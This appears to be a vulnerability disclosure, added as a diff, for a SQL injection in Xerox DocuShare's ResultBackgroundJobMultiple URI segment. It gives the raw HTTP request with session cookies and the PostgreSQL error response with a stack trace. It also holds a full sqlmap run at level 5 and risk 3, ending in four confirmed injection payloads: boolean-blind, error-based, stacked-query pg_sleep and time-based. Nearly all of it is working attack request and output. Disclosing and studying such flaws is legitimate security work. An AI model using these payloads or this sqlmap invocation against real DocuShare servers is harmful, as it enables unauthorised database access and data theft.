@@ -1,0 +1,127 @@
+The following request is vulnerable to a SQL injection in the last URI segment:
+
+GET /docushare/dsweb/ResultBackgroundJobMultiple/1 HTTP/1.1
+Host: 172.31.16.194:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.31.16.194:8080/docushare/dsweb/DeleteConfirmation/1/Collection-14/Services
+Cookie: JSESSIONID=AB82A86859D9C65475DDE5E47216F1A0.tomcat1; AmberUser=64.980A91BBF9D661CB800C2CE5FCCE924AEF4D51CF0280B319873BC31AF0705F0F21.1svt4r2doj13hhu1dc7kf
+Connection: keep-alive
+
+
+Response (goodies):
+
+			<div id="error_vdftitle">
+      <h2><font color="#DD3333">System Error </font></h2>
+      </div>
+      <div id="content">
+      <form name="ERROR" method="post" action="/docushare/dsweb/ApplyError">
+          <table cellpadding="1" cellspacing="1">
+            <tr><td><b>Error Code: 1501</b></td></tr>
+            <tr><td><b><i>SQL error.</i></b></td></tr>
+          </table>
+          <input type="hidden" name="dsexception" value="yes" />
+          <input type="hidden" name="dserrorcode" value="1501" />
+          <input type="hidden" name="detail_message" value="SQL error." />
+        <br />
+        <input type="hidden" name="message" value="Error doing the getBackgroundJobInfo query; nested exception is: 
+	org.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near &#34;&#39;1&#34;
+ Error doing the getBackgroundJobInfo query; nested exception is: 
+	org.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near &#34;&#39;1&#34;
+" />
+        <input type="hidden" name="stacktrace" value="com.xerox.docushare.db.DatabaseException: Error doing the getBackgroundJobInfo query; nested exception is: 
+	org.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near &#34;&#39;1&#34;
+
+	at com.xerox.docushare.db.jdbc.DbConnectionJDBC.getBackgroundJobInfo(DbConnectionJDBC.java:18440)
+	at com.xerox.docushare.impl.server.BackendSessionImpl.getBackgroundJobInfo(BackendSessionImpl.java:13022)
+	at sun.reflect.GeneratedMethodAccessor59.invoke(Unknown Source)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
+	at java.lang.reflect.Method.invoke(Method.java:597)
+	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305)
+	at sun.rmi.transport.Transport$1.run(Transport.java:159)
+	at java.security.AccessController.doPrivileged(Native Method)
+	at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
+	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
+	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
+	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
+	at java.lang.Thread.run(Thread.java:662)
+" />
+        <input type="hidden" name="redirectTo" value="SystemError" />
+
+
+
+---------------------------------------
+
+quick sqlmap run:
+
+bperry@ubuntu:~/tools/sqlmap$ ./sqlmap.py -r /tmp/req.req --level=5 --risk=3 -o --dbms=postgres
+
+    sqlmap/1.0-dev-e8c1c90 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 09:28:49
+
+[09:28:49] [INFO] parsing HTTP request from '/tmp/req.req'
+custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
+[09:28:50] [INFO] testing connection to the target URL
+[09:28:51] [INFO] testing NULL connection to the target URL
+[09:28:51] [INFO] testing if the target URL is stable. This can take a couple of seconds
+[09:28:52] [INFO] target URL is stable
+[09:28:52] [INFO] testing if URI parameter '#1*' is dynamic
+[09:28:52] [INFO] confirming that URI parameter '#1*' is dynamic
+[09:28:52] [WARNING] URI parameter '#1*' does not appear dynamic
+[09:28:52] [INFO] testing for SQL injection on URI parameter '#1*'
+[09:28:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:28:52] [WARNING] reflective value(s) found and filtering out
+[09:28:53] [INFO] URI parameter '#1*' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[09:28:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[09:28:53] [INFO] URI parameter '#1*' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[09:28:53] [INFO] testing 'PostgreSQL inline queries'
+[09:28:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[09:28:53] [WARNING] time-based comparison requires larger statistical model, please wait........                                                                                                                 
+[09:29:04] [INFO] URI parameter '#1*' seems to be 'PostgreSQL > 8.1 stacked queries' injectable 
+[09:29:04] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[09:29:14] [INFO] URI parameter '#1*' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[09:29:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[09:29:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[09:29:14] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[09:29:14] [INFO] target URL appears to have 10 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
+[09:29:31] [INFO] testing 'Generic UNION query (49) - 22 to 40 columns'
+[09:29:33] [INFO] testing 'Generic UNION query (49) - 42 to 60 columns'
+[09:29:34] [INFO] testing 'Generic UNION query (49) - 62 to 80 columns'
+[09:29:36] [INFO] testing 'Generic UNION query (49) - 82 to 100 columns'
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection points with a total of 155 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://172.31.16.194:8080/docushare/dsweb/ResultBackgroundJobMultiple/1 AND 6164=6164
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: http://172.31.16.194:8080/docushare/dsweb/ResultBackgroundJobMultiple/1 AND 7298=CAST((CHR(113)||CHR(113)||CHR(108)||CHR(115)||CHR(113))||(SELECT (CASE WHEN (7298=7298) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(109)||CHR(121)||CHR(113)) AS NUMERIC)
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries
+    Payload: http://172.31.16.194:8080/docushare/dsweb/ResultBackgroundJobMultiple/1; SELECT PG_SLEEP(5)--
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: http://172.31.16.194:8080/docushare/dsweb/ResultBackgroundJobMultiple/1 AND 3994=(SELECT 3994 FROM PG_SLEEP(5))
+---
+[09:30:04] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL
+[09:30:04] [INFO] fetched data logged to text files under '/home/bperry/tools/sqlmap/output/172.31.16.194'
+
+[*] shutting down at 09:30:04
+
+bperry@ubuntu:~/tools/sqlmap$ 
